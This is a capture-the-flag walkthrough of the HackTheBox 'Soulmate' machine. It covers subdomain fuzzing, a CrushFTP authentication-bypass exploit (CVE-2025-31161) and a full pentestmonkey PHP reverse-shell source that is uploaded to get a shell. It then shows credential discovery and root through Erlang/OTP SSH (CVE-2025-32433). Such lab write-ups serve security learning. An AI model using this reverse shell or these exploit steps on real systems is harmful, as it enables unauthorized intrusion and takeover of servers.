## Enumeration
I start with the reconnaissance with `nmap`

```sh
mkdir nmap
nmap -sV -sC -oA nmap/soulmate 10.10.11.86
```

![](../../../attachments/Pasted%20image%2020251111111405.png)

We see that the server is configured to respond to the name `soulmate.htb` rather than the IP address `10.10.11.86`. See to resolve that we have to edit the `/etc/hosts` file and write  `10.10.11.86  soulmate.htb`.

```sh
sudo nano /etc/hosts
```

After that if we type the IP address of the machine to our browser we will be able to see the Web application:

![](../../../attachments/Pasted%20image%2020251111111734.png)

First, I ran `gobuster` for directory enumeration with the command:
```sh
gobuster dir -u http://soulmate.htb --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```
but I didn't find anything notable.

After that I created an account on the Soulmate site but again I didn't find anything useful.

So I tried a different strategy to run `ffuf` and modifying the `Host` header for each request. So at first I used this command:
```sh
ffuf -u http://soulmate.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.soulmate.htb" --fs 652
```

![](../../../attachments/Pasted%20image%2020251111122712.png)

but I was getting a lot of garbage output and I couldn't find anything useful, so I used this command instead, where I would filter only the responses 200, 301 and 302 but I was seeing that for response 302 the most common size was 154 (which was garbage) so I would filter the `size 154` 

```sh
ffuf -u http://soulmate.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.soulmate.htb" --mc 200,301,302 -fs 154 -s
```

![](../../../attachments/Pasted%20image%2020251111122224.png)
and I found the `ftp` directory.

So we have to edit the `/etc/hosts` file again and add this directory  `10.10.11.86  soulmate.htb ftp.soulmate.htb`.

And now if we type `http://ftp.soulmate.htb` on our browser we are redirected to `http://ftp.soulmate.htb/WebInterface/login.html`

![](../../../attachments/Pasted%20image%2020251111123216.png)

But I couldn't login as admin or with the my account credentials, so i checked the source code for more information.

![](../../../attachments/Pasted%20image%2020251111125306.png)

```js
.register("/WebInterface/new-ui/sw.js?v=11.W.657-2025_03_08_07_52")
```

and searching on the Internet about known vulnerabilities about `CrushFTP` I found this 

![](../../../attachments/Pasted%20image%2020251111125445.png)

so I understood that the `11.w.657` was something like a version and then I found the vulnerability `CVE-2025-31161`. Searching for this vulnerability I found this GitHub repo:

![](../../../attachments/Pasted%20image%2020251111125631.png)

so I downloaded the Python script and then I ran this command:
```python
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user new --password 12345
```

![](../../../attachments/Pasted%20image%2020251111130245.png)

So then we just created a new user named `new` with root privileges so all I had to do was to login in on the server.

![](../../../attachments/Pasted%20image%2020251111130142.png)

and we are in!!!

![](../../../attachments/Pasted%20image%2020251111130319.png)

After that I went to the `Admin` panel:

![](../../../attachments/Pasted%20image%2020251111130418.png)

and then to `User Manager` in order to find some user credentials.

So on the left side there were some users, so I clicked the user `ben` which he had already a password, then I clicked `Generate Random Password`
in which a password was created, I pressed `Use this` and then `Save`

![](../../../attachments/Pasted%20image%2020251111130848.png)

I tried to ssh into `ben` but I couldn't for some reason that I didn't know, so instead I tried to login as `ben` in the `CrushFTP`.

![](../../../attachments/Pasted%20image%2020251111132931.png)

After I was logged in as `ben` I went to to `webProd` and I was that I could upload any PHP file.

So I could upload a PHP reverse shell. I found this made PHP reverse shell from `pentestmonkey`

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

All I had to change was `ip` and `port`. Then I uploaded the `reverse_shell.php`

I opened another terminal to run `netcat` on the port that I put:

![](../../../attachments/Pasted%20image%2020251111135613.png)

So all I had to do was run the PHP file to get a shell. At first, I tried to access the file at `http://ftp.soulmate.htb/#/webProd/reverse_shell.php` but this only triggered a download of the file instead of actually executing it.

What happens is that the application stores the uploaded files in a published web directory that can be accessed via the browser. In the case of `ftp.soulmate.htb` we used the upload function at `http://ftp.soulmate.htb/#/webProd`.

However, the upload is not placed directly under `/webProd`, but instead it is stored in the document root (e.g. `var/www/html` or a similar location). Therefore, when we go to `http://soulmate.htb/reverse_shell.php` the PHP code will be executed.

So I just browse to `http://soulmate.htb/reverse_shell.php` and then I get a shell:

![](../../../attachments/Pasted%20image%2020251111140237.png)

I upgrade the shell to an interactive one:
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](../../../attachments/Pasted%20image%2020251111140504.png)

Firstly, I examine the `/etc/passwd` file, which contains users with valid shell entries:
```sh
cat /etc/passwd | grep -i bash
```

![](../../../attachments/Pasted%20image%2020251111140702.png)

We find two users on the system: `root` and `ben`, so a next logical move would be to lateral movement to `ben`
```sh
ls -l /home/ben
```

But we do not have permission to access Ben's home directory:

![](../../../attachments/Pasted%20image%2020251111140808.png)

Next I try to investigate the local listening ports on the machine:

```sh
ss -tlp
```

![](../../../attachments/Pasted%20image%2020251111141525.png)

We see that the port `2222` is open, so we check what is running on this port with `netcat`:
```sh
nc 127.0.0.1 2222
```

![](../../../attachments/Pasted%20image%2020251111141733.png)

We see that it's running `Erlang 5.2.9`. I try to find directories and files with the name `erlang`:
```
find / -name erlang* 2>/dev/null
```

![](../../../attachments/Pasted%20image%2020251111142441.png)

After a lot of time of searching I found `erlang_login` and there I went to the file `start.escript` and when I read this file I found this line:


![](../../../attachments/Pasted%20image%2020251111142555.png)

So we found `ben`'s password. All we have to do is to ssh into that account and find the user flag!!!:

![](../../../attachments/Pasted%20image%2020251111142814.png)


## Privilege Escalation

I tried `sudo -l` but it didn't work:

![](../../../attachments/Pasted%20image%2020251111142912.png)

On my Kali machine I went to the directory `/usr/share/peass/linpeas` and I opened a Python server on port 8003

Then I downloaded `linpeas.sh` to the target machine and I ran it:

![](../../../attachments/Pasted%20image%2020251111143048.png)

![](../../../attachments/Pasted%20image%2020251111143119.png)
But again I didn't find anything useful. After that I tried to see the SUIDs:

![](../../../attachments/Pasted%20image%2020251111143858.png)

But again nothing useful.

Then I thought that since `Erlang` is SSH and it is running on port 2222 maybe I should use this port to SSH into `ben` again, so:
```sh
ssh ben@localhost -p 2222
```

![](../../../attachments/Pasted%20image%2020251111144240.png)

After searching on the Internet, I found the vulnerability `CVE-2025-32433` a critical vulnerability disclosed in the Erlang/OTP SSH implementation that allows unauthenticated remote code execution (RCE).

So since I was already in the SSH, I searched for code execution codes or OS commands. I found in the website `vuln.be`:

![](../../../attachments/Pasted%20image%2020251111145745.png)

So using the `os:cmd` functionality I executed commands as root and I retrieved the root flag!!!

![](../../../attachments/Pasted%20image%2020251111145359.png)




